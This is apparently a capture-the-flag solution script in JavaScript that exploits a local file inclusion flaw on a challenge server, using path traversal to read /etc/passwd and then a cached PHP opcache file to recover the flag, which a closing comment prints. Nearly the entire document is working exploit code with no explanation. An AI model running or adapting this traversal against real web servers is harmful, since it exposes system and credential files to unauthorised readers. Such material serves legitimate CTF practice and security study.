var result = '';
var url = "http://carthagods.3k.ctf.to:8039/";
const lfi_vector = "js/?eba1b61134bf5818771b8c3203a16dc9=";
const system_id = "e2c6579e4df1d9e77e36d2f4ff8c92b3";

(async function (){
    await fetch(url + lfi_vector + "../../../../../etc/passwd").then((x) => x.text()).then((x) => result = x);
    
    if (result.indexOf('root:x') != -1) {
        console.log('[*] LFI Success');
    }
    await fetch(url + lfi_vector + `../../../../../../../var/www/cache/${system_id}/var/www/html/flag.php.bin`).then((x) => x.text()).then((x) => console.log(x));
})();

// Output : 3k{Hail_the3000_years_7hat_are_b3h1nd}
